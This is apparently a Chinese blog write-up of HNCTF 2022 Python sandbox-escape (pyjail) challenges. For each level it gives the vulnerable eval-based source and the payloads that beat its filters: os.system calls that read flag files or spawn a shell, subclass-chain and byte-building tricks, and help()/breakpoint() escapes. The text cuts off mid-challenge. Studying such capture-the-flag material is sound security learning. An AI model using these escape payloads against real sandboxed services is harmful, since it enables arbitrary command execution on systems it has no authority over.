---
title: pyjail沙箱逃逸
date: 2026-09-14 22:16:47
description: python沙箱逃逸基础知识
categories:
  - 笔记
tags:
  - 日常
---

# #pyjail沙箱逃逸

打算借着这次moectf2026的python沙箱题与HNCTF2022的python沙箱题来学习
HNCTF2022的题在nss上有，但题目太散，所以我就借这篇文章的顺序来做题：[借助NSS平台题目，以2022年HNCTF为例展开分析](https://www.cnblogs.com/mumuhhh/p/17811377.html)、[Pyjail学习1](https://jmx0hxq.github.io/2024/02/06/PyJail%E5%AD%A6%E4%B9%A01/#%E5%89%8D%E8%A8%80)

### [HNCTF 2022 Week1]calc_jail_beginner(JAIL)

题目附件

```python
#Your goal is to read ./flag.txt
#You can use these payload liked `__import__('os').system('cat ./flag.txt')` or `print(open('/flag.txt').read())`

WELCOME = '''
  _     ______      _                              _       _ _ 
 | |   |  ____|    (_)                            | |     (_) |
 | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
 | '_ \|  __| / _` | | '_ \| '_ \ / _ \ '__|  _   | |/ _` | | |
 | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
 |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
               __/ |                                           
              |___/                                            
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
print('Answer: {}'.format(eval(input_data)))
```

- `__import__()` 函数用于动态**加载**类和函数 。
- system 用于执行系统命令
- **os库**是Python的一个标准库，它提供了丰富的方法来处理文件和目录等操作系统任务

payload

```
__import__('os').system('cat flag')
open('flag').read()
```

### [HNCTF 2022 Week1]python2 input(JAIL)

```python
# It's escape this repeat!

WELCOME = '''
              _   _      ___        ___    _____             _    _ _   
             | | | |    / _ \      |__ \  |_   _|           | |  | | |  
  _ __  _   _| |_| |__ | | | |_ __    ) |   | |  _ __  _ __ | |  | | |_ 
 | '_ \| | | | __| '_ \| | | | '_ \  / /    | | | '_ \| '_ \| |  | | __|
 | |_) | |_| | |_| | | | |_| | | | |/ /_   _| |_| | | | |_) | |__| | |_ 
 | .__/ \__, |\__|_| |_|\___/|_| |_|____| |_____|_| |_| .__/ \____/ \__|
 | |     __/ |                                        | |               
 |_|    |___/                                         |_|                               
'''

print WELCOME

print "Welcome to the python jail"
print "But this program will repeat your messages"
input_data = input("> ")
print input_data
```

payload

```
__import__('os').system('cat flag')
open('flag').read()
```

### [HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)

```python
#the function of filter will banned some string ',",i,b
#it seems banned some payload 
#Can u escape it?Good luck!

def filter(s):
    not_allowed = set('"\'`ib')
    return any(c in not_allowed for c in s)

WELCOME = '''
  _                _                           _       _ _   _                _ __ 
 | |              (_)                         (_)     (_) | | |              | /_ |
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|
              __/ |                          _/ |                                  
             |___/                          |__/                                                                                      
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if filter(input_data):
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))
```

过滤了

```
',",`,i,b
```

payload

```
open(chr(102)+chr(108)+chr(97)+chr(103)).read()
```

chr：返回值是当前整数**对应的 ASCII 字符**。
ord：返回对应的 Unicode 码点（整数）。
chr与ord互逆

### [HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)

```python
#the length is be limited less than 13
#it seems banned some payload 
#Can u escape it?Good luck!

WELCOME = '''
  _                _                           _       _ _   _                _ ___  
 | |              (_)                         (_)     (_) | | |              | |__ \ 
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / / 
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_ 
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|
              __/ |                          _/ |                                    
             |___/                          |__/                                                                            
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if len(input_data)>13:
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))
```

限制长度13

**方法一**

输入

```
breakpoint()
```

原理是利用了 Python 内置函数 `breakpoint()` 进入调试器 `pdb`
在 `pdb` 里，可以用 `!` 执行任意 Python 语句

```
!print(open('flag').read())
```

**方法二**

输入

```
eval(input())
```

然后程序会再次等待你输入。第二次输入就不经过题目的长度检查了

```
open("flag").read()
```

### [HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)

```python
#the length is be limited less than 13
#it seems banned some payload 
#banned some unintend sol
#Can u escape it?Good luck!

def filter(s):
    BLACKLIST = ["exec","input","eval"]
    for i in BLACKLIST:
        if i in s:
            print(f'{i!r} has been banned for security reasons')
            exit(0)

WELCOME = '''
  _                _                           _       _ _ _                _ ___    _____ 
 | |              (_)                         (_)     (_) | |              | |__ \  | ____|
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ 
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ 
              __/ |                          _/ |                                          
             |___/                          |__/                                                                                                            
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
filter(input_data)
if len(input_data)>13:
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))
```

过滤了 `eval、input、exec`
可以沿用上一题的payload，python中存在unicode的注入，所以直接调用level2的payload改下unicode就OK了

```
𝓮val(inp𝓾t())
```

注：如果传输带有unicode的payload无法输入的话，就用pwntools

```
from pwn import *

io = remote("node5.anna.nssctf.cn",28141)
io.sendlineafter("Enter your expression and I will evaluate it for you.","𝓮val(inp𝓾t())")
io.interactive()
```

### [HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL)

```python
#!/usr/bin/env python3
WELCOME = '''
  _                _                           _       _ _   _                _ ____  
 | |              (_)                         (_)     (_) | | |              | |___ \ 
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ < 
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/ 
              __/ |                          _/ |                                     
             |___/                          |__/                                                                                       
'''

print(WELCOME)
#the length is be limited less than 7
#it seems banned some payload 
#Can u escape it?Good luck!
print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if len(input_data)>7:
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))
```

限制长度7
很早就想用 help()

```bash
> help()
help> sys
Help on built-in module sys:

NAME
    sys

MODULE REFERENCE
    https://docs.python.org/3.8/library/sys

    The following documentation is automatically generated from the Python
    source files.  It may be incomplete, incorrect or include features that
    are considered implementation detail and may vary between Python
    implementations.  When in doubt, consult the module reference at the
    location listed above.

DESCRIPTION
    This module provides access to some objects used or maintained by the
    interpreter and to functions that interact strongly with the interpreter.

    Dynamic objects:

    argv -- command line arguments; argv[0] is the script pathname if known
    path -- module search path; path[0] is the script directory, else ''
    modules -- dictionary of loaded modules
--More--!cat flag
!cat flag
flag=NSSCTF{2aa84c7f-1556-47ad-94bb-da62ea292851}
```

### [HNCTF 2022 Week1]lake lake lake(JAIL)

源代码

```python
#it seems have a backdoor
#can u find the key of it and use the backdoor

fake_key_var_in_the_local_but_real_in_the_remote = "[DELETED]"

def func():
    code = input(">")
    if(len(code)>9):
        return print("you're hacker!")
    try:
        print(eval(code))
    except:
        pass

def backdoor():
    print("Please enter the admin key")
    key = input(">")
    if(key == fake_key_var_in_the_local_but_real_in_the_remote):
        code = input(">")
        try:
            print(eval(code))
        except:
            pass
    else:
        print("Nooo!!!!")

WELCOME = '''
  _       _          _       _          _       _        
 | |     | |        | |     | |        | |     | |       
 | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ 
 | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \
 | | (_| |   <  __/ | | (_| |   <  __/ | | (_| |   <  __/
 |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     
'''

print(WELCOME)

print("Now the program has two functions")
print("can you use dockerdoor")
print("1.func")
print("2.backdoor")
input_data = input("> ")
if(input_data == "1"):
    func()
    exit(0)
elif(input_data == "2"):
    backdoor()
    exit(0)
else:
    print("not found the choice")
    exit(0)
```

题目大概意思是走1获取通关的key，然后拿着key进入2进行验证key，验证成功即可随便输入。
先走1，使用globals()获取全局的变量

```
> 1
>globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f095fed0a90>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctf/./server.py', '__cached__': None, 'key_9b1d015375213e21': 'a34af94e88aed5c34fb5ccfe08cd14ab', 'func': <function func at 0x7f096006fd90>, 'backdoor': <function backdoor at 0x7f095ff31fc0>, 'WELCOME': '\n  _       _          _       _          _       _        \n | |     | |        | |     | |        | |     | |       \n | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ \n | |/ _` | |/ / _ \\ | |/ _` | |/ / _ \\ | |/ _` | |/ / _  | | (_| |   <  __/ | | (_| |   <  __/ | | (_| |   <  __/\n |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___|                                                                                                                                                                     \n', 'input_data': '1'}
```

得到key为a34af94e88aed5c34fb5ccfe08cd14ab
然后进入2

```
Now the program has two functions
can you use dockerdoor
1.func
2.backdoor
> 2
Please enter the admin key
>a34af94e88aed5c34fb5ccfe08cd14ab
>open("flag").read()
flag=NSSCTF{9838237e-fd38-45d4-a82d-f4a8e0c8eca3}
```

### [HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)

```python
#it seems have a backdoor as `lake lake lake`
#but it seems be limited!
#can u find the key of it and use the backdoor

fake_key_var_in_the_local_but_real_in_the_remote = "[DELETED]"

def func():
    code = input(">")
    if(len(code)>6):
        return print("you're hacker!")
    try:
        print(eval(code))
    except:
        pass

def backdoor():
    print("Please enter the admin key")
    key = input(">")
    if(key == fake_key_var_in_the_local_but_real_in_the_remote):
        code = input(">")
        try:
            print(eval(code))
        except:
            pass
    else:
        print("Nooo!!!!")

WELCOME = '''
  _         _          _         _          _         _        
 | |  ____ | |        | |  ____ | |        | |  ____ | |       
 | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____ 
 | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \
 | | | (_| |   <  __/ | | | (_| |   <  __/ | | | (_| |   <  __/
 |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|
     \____/               \____/               \____/                                                                                                                                                                                                                                        
'''

print(WELCOME)

print("Now the program has two functions")
print("can you use dockerdoor")
print("1.func")
print("2.backdoor")
input_data = input("> ")
if(input_data == "1"):
    func()
    exit(0)
elif(input_data == "2"):
    backdoor()
    exit(0)
else:
    print("not found the choice")
    exit(0)

```

通道1限制长度6
我们调用help()进入函数，输入server或者`__main__`查看key，这里我用`__main__`演示
（我猜应该有挺多方法的)

```
>help()
help> __main__
Help on module __main__:

NAME
    __main__

DESCRIPTION
    #it seems have a backdoor as `lake lake lake`
    #but it seems be limited!
    #can u find the key of it and use the backdoor

FUNCTIONS
    backdoor()

    func()

DATA
    WELCOME = '\n  _         _          _         _          _  ...       ...
    __annotations__ = {}
    input_data = '1'
    key_9d38ee7f31d6126d = '95c720690c2c83f0982ffba63ff87338'

FILE
    /home/ctf/server.py
--More--
```

拿到key = 95c720690c2c83f0982ffba63ff87338
之后的步骤就和上一题一样了

### [HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL)

```python
#No danger function,no chr,Try to hack me!!!!
#Try to read file ./flag


BANLIST = ['__loader__', '__import__', 'compile', 'eval', 'exec', 'chr']

eval_func = eval

for m in BANLIST:
    del __builtins__.__dict__[m]

del __loader__, __builtins__

def filter(s):
    not_allowed = set('"\'`')
    return any(c in not_allowed for c in s)

WELCOME = '''
  _                _                           _       _ _   _                _ _  _   
 | |              (_)                         (_)     (_) | | |              | | || |  
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_ 
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |  
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|  
              __/ |                          _/ |                                      
             |___/                          |__/                                                                                                                                             
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if filter(input_data):
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval_func(input_data)))

```

可以看出ban了一些函数
chr被ban了，所以字符串构造就要换一种方式了，使用bytes([]).decode()
payload

```
open((bytes([102])+bytes([108])+bytes([97])+bytes([103])).decode()).read()
open(bytes([46,47,102,108,97,103])).read()		//bytes([46,47,102,108,97,103]) = ./flag
```

bytes() 用于**创建字节**序列，返回类型 `bytes`

### [HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)

```
Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,",' Good luck!
```

用上一题的bytes也能过

payload

```
open(bytes([46,47,102,108,97,103])).read()
或者
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(bytes([115])+bytes([121])+bytes([115])+bytes([116])+bytes([101])+bytes([109])).decode()]((bytes([99])+bytes([97])+bytes([116])+bytes([32])+bytes([102])+bytes([108])+bytes([97])+bytes([103])).decode())
```

用 Python 的继承链枚举全部已加载类：

```
().__class__.__base__.__subclasses__()
```

末尾发现 `<class 'os._wrap_close'>`
拿到 `os` 模块的全局字典。

```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__
```

由于不能使用引号写出 `system`，用 `bytes([...])` 构造命令字符串。

```
list(().__class__.__base__.__subclasses__()[-4].__init__.__globals__.values())[47](bytes([99,97,116,32,102,108,97,103]))
```

### [HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL)

```
Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,",' Good luck!
```

这次把byte被ban了，可以用type来获取bytes。type(obj) 会返回该对象所属的类
而且根据提示可知需要查文件，因此这题flag肯定不是flag了，需要执行ls查看文件名。。。
先说明一下bytes和type的关系：

```python
bytes = type(str(1).encode())
"system" == (type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()

<class 'os._wrap_close'> == [].__class__.__mro__[-1].__subclasses__()[-4]

# 执行system(???)
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()](???)
```

 同理反抽就可以执行system("ls")然后cat flag了

```
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()]((type(str(1).encode())([108])+type(str(1).encode())([115])).decode())
```

**法二：利用Show subclasses with tuple找到bytes类：**

```
().__class__.__base__.__subclasses__()
```

```
> ().__class__.__base__.__subclasses__()
Answer: [<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>....
```

可发现bytes类的索引是6。所以有

```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())

os.system("sh")
```

```
Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,",' Good luck!
> ().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
sh: 0: can't access tty; job control turned off
$ ls /
bin dev home lib32 libx32 mnt proc run srv tmp var
boot etc lib lib64 media opt root sbin sys usr
$ ls
flag_y0u_CaNt_FiNd_mE server.py
$ cat flag_y0u_CaNt_FiNd_mE
flag=NSSCTF{46bbea46-9ff6-4dae-adb6-3c06a95e2fad}
$
```

**法三：利用doc：**

```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])
```

### [HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)

```
Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,",',+ Good luck!
```

我们用`.__add__`来替换加号，然后仍然用上一题的方法去构造system("ls")然后cat flag

```
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]((type(str(1).encode())([108]).__add__(type(str(1).encode())([115]))).decode())
```

写个脚本自动生成字符串

```
lst = []
for i in "cat flag_y0u_CaNt_FiNd_mE":
lst.append(f"type(str(1).encode())([{ord(i)}])")

print("("+lst.pop(0),end='')
for i in lst:
print(f".__add__({i})",end='')

print(").decode()")
```

得到

```
(type(str(1).encode())([99]).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([32])).__add__(type(str(1).encode())([102])).__add__(type(str(1).encode())([108])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([103])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([48])).__add__(type(str(1).encode())([117])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([67])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([70])).__add__(type(str(1).encode())([105])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([100])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([109])).__add__(type(str(1).encode())([69]))).decode()
```

然后执行

```
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]((type(str(1).encode())([99]).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([32])).__add__(type(str(1).encode())([102])).__add__(type(str(1).encode())([108])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([103])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([48])).__add__(type(str(1).encode())([117])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([67])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([70])).__add__(type(str(1).encode())([105])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([100])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([109])).__add__(type(str(1).encode())([69]))).decode())
```

 **法二：仍然是4.1的payload接着用：**

```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
```

**法三： 还是利用doc的方法但需要改变字符串的拼接方法：除了直接用+连接字符串以外，还有一种常用的方法，如字符串'1234'可以用如下的方式得到：**

```
''.join(['1', '2', '3', '4'])
```

但是我们需要绕过一开始的''，直接用str()：

```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))
```

### [HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL)

```
Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,",',+ Good luck!
```

哎！终于ban了type，但是又学到了一招list(dict(system=114514))[0]可以获取system这个字符串
因此直接执行system(sh)[HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)

```
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[list(dict(system=1))[0]](list(dict(sh=1))[0])
```

而且发现这道题使用上题的法二法三还能接着用哈哈哈。。

### [HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)

```
It's so easy challenge!
Seems flag into the dir()
```

这题有非预期，直接open   read

```
open("flag").read()
```

### [HNCTF 2022 WEEK2]calc_jail_beginner_level5.1(JAIL)

```
It's so easy challenge!
Seems flag into the dir()
```

考点: ==dir()函数查看变量属性==
用dir()查看，open啥的都被ben了

```
> dir()		#  获得当前模块的属性列表
['__builtins__', 'my_flag']
```

跟进 my_flag

```
dir(my_flag)
```

发现一个flag_level5

```
dir(my_flag.flag_level5)
```

发现一个encode方法

```
my_flag.flag_level5.encode()	#返回字符串的utf-8编码版本
```

### [HNCTF 2022 WEEK2]laKe laKe laKe(JAIL)

```python
import random
from io import StringIO
import sys
sys.addaudithook          # 注意：这里调用了 addaudithook，但没传参，其实会报错（需传函数）
                          # 不过后面又重新调用了，所以这行是无效的（作者手滑了？）

# 要屏蔽的危险内置函数名称列表
BLACKED_LIST = ['compile', 'eval', 'exec', 'open']

# 在删除前，先把 eval 和 open 的引用存下来（留后门/自己用）
eval_func = eval
open_func = open

# 从 __builtins__ 的字典中暴力删除这些关键函数，让普通代码没法直接调用
for m in BLACKED_LIST:
    del __builtins__.__dict__[m]


# 自定义审计钩子函数，用来拦截高危系统调用事件
def my_audit_hook(event, _):
    # 定义要禁止的事件集合（执行系统命令、启动子进程等）
    BALCKED_EVENTS = set({'pty.spawn', 'os.system', 'os.exec', 'os.posix_spawn','os.spawn','subprocess.Popen'})
    if event in BALCKED_EVENTS:
        raise RuntimeError('Operation banned: {}'.format(event))  # 触发就抛异常


def guesser():
    game_score = 0
    sys.stdout.write('Can u guess the number? between 1 and 9999999999999 > ')
    sys.stdout.flush()
    # 生成一个超大的随机整数作为“正确答案”
    right_guesser_question_answer = random.randint(1, 9999999999999)
    
    # 把标准输出/错误重定向到 StringIO 里，防止用户输入的内容产生垃圾输出
    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout

    try:
        # 关键！使用之前备份的 eval_func 执行用户输入的字符串
        # 传入了空字典 {} 作为全局和局部作用域，试图“隔离”环境
        input_data = eval_func(input(''),{},{})
    except Exception:
        # 如果执行报错，恢复标准输出，提示并返回 0 分
        sys.stdout = challenge_original_stdout
        print("Seems not right! please guess it!")
        return game_score
    # 无论是否报错，都恢复标准输出（注意：这里如果 eval 成功，也会恢复）
    sys.stdout = challenge_original_stdout

    # 如果用户输入（经过 eval 计算后的值）正好等于随机数，加一分
    if input_data == right_guesser_question_answer:
        game_score += 1
    
    return game_score

# 花里胡哨的 ASCII 艺术标题
WELCOME='''
  _       _  __      _       _  __      _       _  __    
 | |     | |/ /     | |     | |/ /     | |     | |/ /    
 | | __ _| ' / ___  | | __ _| ' / ___  | | __ _| ' / ___ 
 | |/ _` |  < / _ \ | |/ _` |  < / _ \ | |/ _` |  < / _ \
 | | (_| | . \  __/ | | (_| | . \  __/ | | (_| | . \  __/
 |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|
                                                         
'''

def main():
    print(WELCOME)
    print('Welcome to my guesser game!')
    game_score = guesser()
    # 只有当猜中（game_score == 1）时，才用备份的 open_func 读取 flag 文件并打印
    if game_score == 1:
        print('you are really super guesser!!!!')
        print(open_func('flag').read())   # 目标：拿到 flag 内容
    else:
        print('Guess game end!!!')

if __name__ == '__main__':
    # 真正挂载审计钩子
    sys.addaudithook(my_audit_hook)
    main()
```

考点: `__import__("sys").__stdout__.write`绕过无回显

这里需要猜个很大随机数,猜对了才读flag,还把`sys.stdout、sys.seterr`重定向了，调用print无法输出,这里是通过`__import__("sys").__stdout__.write`向屏幕写入数据
我们读取flag文件方式有两种:

1. os.read()函数:
   ![image1](/images/pyjail沙箱逃逸/image1.png)

   ```
   __import__("sys").__stdout__.write(__import__("os").read(__import__("os").open("./flag",__import__("os").O_RDONLY), 0x114).decode())
   ```

   **这些payload有什么不懂的话丢给ai看**

2. io.open()函数

   ```
   __import__("io").open("test").read()类似这样可以直接读取函数
   payload:
   __import__("sys").__stdout__.write(__import__("io").open("flag").read())
   ```

3. 最后这个方法是丢给ai做出来的

   - 虽然 `eval` 被删了，但作者自己留了 `eval_func` 备份，并在 `guesser()` 里用这个备份执行用户的输入。
   - 虽然传入了空作用域 `{}`，但 Python 的 `eval` 会自动注入 `__builtins__`，所以 `__import__` 仍然可用。
   - 审计钩子只拦截了特定事件，但 **没有拦截 `sys._getframe`**。攻击者完全可以在输入中写 `__import__('sys')._getframe(1).f_locals['right_guesser_question_answer']`，直接偷到随机数，让比较成立，从而拿到 flag。

### [HNCTF 2022 WEEK2]lak3 lak3 lak3(JAIL)

```python
#Hi hackers,lak3 comes back
#Have a good luck on it! :Wink:

import random
from io import StringIO
import sys

# 下面这行只是引用了函数对象，没加括号调用，所以啥也不干（纯属迷惑行为）
sys.addaudithook  

# 要删除的内置危险函数名列表
BLACKED_LIST = ['compile', 'eval', 'exec']

# ⚠️ 关键操作：在删除之前先把 eval 和 open 的引用存起来！
# 后续代码会使用这个存根来执行任意代码
eval_func = eval  
open_func = open  

# 从 __builtins__ 中暴力删除 'compile', 'eval', 'exec'
# 这样直接调用 eval() 或 exec() 就会报错
for m in BLACKED_LIST:
    del __builtins__.__dict__[m]

# 自定义审计钩子：当触发特定事件时直接抛出异常
def my_audit_hook(event, _):
    # 注意这里拼写错误（BALCKED），但不影响功能
    BALCKED_EVENTS = set({
        'pty.spawn', 
        'os.system', 
        'os.exec', 
        'os.posix_spawn',
        'os.spawn',
        'subprocess.Popen',
        'code.__new__',
        'function.__new__',
        'cpython._PySys_ClearAuditHooks',
        'open'          # 阻止 open 函数调用
    })
    if event in BALCKED_EVENTS:
        raise RuntimeError('Operation banned: {}'.format(event))

def guesser():
    game_score = 0
    sys.stdout.write('Can u guess the number? between 1 and 9999999999999 > ')
    sys.stdout.flush()
    
    # 生成随机目标数
    right_guesser_question_answer = random.randint(1, 9999999999999)
    
    # ⚠️ 漏洞铺垫：重定向 stdout/stderr 到内存 StringIO，
    # 目的是让 eval 执行时的 print 输出被吞掉，不显示给用户
    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout

    try:
        # ⚠️ 致命漏洞：使用保存的 eval_func 执行用户输入！
        # 第二个和第三个参数是空字典，意味着 globals 和 locals 几乎为空，
        # 但 __builtins__ 会被自动注入，因此 __import__ 依然可用
        input_data = eval_func(input(''), {}, {})
    except Exception:
        # 如果执行出错，恢复 stdout 并提示
        sys.stdout = challenge_original_stdout
        print("Seems not right! please guess it!")
        return game_score
    
    # 恢复 stdout（但之前的输出已经被 StringIO 吃掉了）
    sys.stdout = challenge_original_stdout

    # 只有输入值等于随机数才能加 1 分（几乎不可能蒙对）
    if input_data == right_guesser_question_answer:
        game_score += 1
    
    return game_score

WELCOME='''
  _       _    ____    _       _    ____    _       _    ____  
